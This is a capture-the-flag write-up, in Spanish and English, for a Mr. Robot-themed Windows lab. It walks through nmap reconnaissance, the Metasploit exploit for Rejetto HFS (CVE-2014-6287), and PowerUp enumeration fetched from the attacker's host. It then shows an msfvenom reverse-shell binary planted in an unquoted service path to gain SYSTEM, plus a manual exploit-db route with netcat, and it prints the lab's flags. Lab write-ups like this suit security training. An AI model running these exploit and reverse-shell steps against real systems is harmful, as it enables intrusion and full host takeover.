# Steel mountain module

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

Who is the employee of the month? **bill harper** (cargar web y ver el nombre de la foto)

## Vector de ataque

En esencia el vector de ataque es el siguiente:

1. Reconocimiento
2. Explotar vulnerabilidad
3. Escalar privilegios
4. Lo mismo pero sin Metasploit

## 1. Reconocimiento

```
nmap -F 10.8.153.49
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 16:16 EDT
Nmap scan report for 10.8.153.49
Host is up (0.35s latency).
Not shown: 89 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
```

Scan the machine with nmap. What is the other port running a web server on? **8080**

```
sudo nmap -sV -p80,8080 --script=vuln,vulners 10.8.153.49
```

```
searchsploit fileserver
```
Take a look at the other web server. What file server is running? **Rejetto HTTP File Server**

```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
What is the CVE number to exploit this file server? **2014-6287**

## 2. Explotar vulnerabilidad
```
msfconsole
```
```
msf6 > search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

```
```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > 
```
```
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.8.153.49
rhosts => 10.8.153.49
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.8.153.49
lhost => 10.8.153.49
msf6 exploit
```
```
meterpreter> shell
```
```
type C:\Users\bill\Desktop\user.txt
```
Use Metasploit to get an initial shell. What is the user flag? **b04763b6fcf51fcd7c13abc7db4fd365**

## 3. Escalar privilegios
Acciones a realizar en la maquina atacante

1. Obtener PowerUp.ps1 y dejarlo en una carpeta a compartir (usare la raiz)

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```
2. Levantar servidor web para compartir archivo
```
python -m http.server 80
```

En maquina atacada
1. Obtener script
```
powershell -c "wget 10.8.153.49/PowerUp.ps1 -OutFile PowerUp.ps1"
```

En metasploit
2. Correr script 
```
meterpreter > load powershell
meterpreter > powershell_shell
```
```
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

Si nos fijamos, el Path es vulnerable y el service puede ser reiniciado (CanRestart: True)

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?: **AdvancedSystemCareService9**

Ahora vamos a crear un exploit con msfvenom que apunte al servicio Advanced.exe (abusando de la vulnerabilidad), en nuestra maquina atacante.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.153.49 LPORT=4443 -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```

Descargamos el "servicio"
```
PS > wget 10.8.153.49/Advanced.exe -OutFile Advanced.exe
```

Ahora tenamos 2 opciones, o levantamos un netcat en el puerto 4443 o usamos multi/handler en metasploit. Veamos ambos casos.

Netcat
```
nc -lvp 4443
```

Metasploit
```
use multi/handler
use windows/shell/reverse_tcp
set lhost 10.8.153.49
set lport 4443
```

En la maquina victima, copiamos el binario a la ruta vulnerable
```
PS > copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"
```

Paramos y arrancamos el servicio **(Detalle, para que esto funcione debe hacerse en el shell comun y no por powershell)**
```
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3220
        FLAGS              : 
```

Veremos que ya tenemos consola system en nuestros listeners
```
listening on [any] 4443 ...
10.10.92.216: inverse host lookup failed: Unknown host
connect to [10.8.153.49] from (UNKNOWN) [10.10.92.216] 49492
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
```
C:\Windows\system32>whoami
whoami
nt authority\system
```
```
type C:\Users\Administrator\Desktop\root.txt
```
What is the root flag?: **9af5f314f57607c00fd09803a587db80**

## 4. Lo mismo pero sin Metasploit

Para explotar la vulnerabilidad se debe descarar el siguiente exploit https://www.exploit-db.com/exploits/39161

Una vez descargado debemos hacer un par de cosas antes de proceder:

1. Modificar parámetros del script

```
...
ip_addr = "10.8.153.49" #local IP address
local_port = "4443" # Local Port number
...
```

2. Copiar binario nc.exe y dejarlo en una carpeta a compartir (usare la raiz)

```
cp /usr/share/windows-resources/binaries/nc.exe .
```
3. Levantar servidor web para compartir archivo
```
python -m http.server 80
```
4. Levantar listener ncat
```
nc -lvp 4443
```
5. Correr script (a mi script le puse silver.py pero puede ser cualquier nombre)
```
python2 silver.py 10.10.92.216 8080
```

Eso nos levantará la shell en winlol
```
listening on [any] 4443 ...
10.10.92.216: inverse host lookup failed: Unknown host
connect to [10.8.153.49] from (UNKNOWN) [10.10.92.216] 49232
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```

Estando dentro, descargamos winpeas, vemos que tiene vulneración de Path y seguimos el mismo procedimiento que con Metasploit.

---
Happy exploiting - Zpx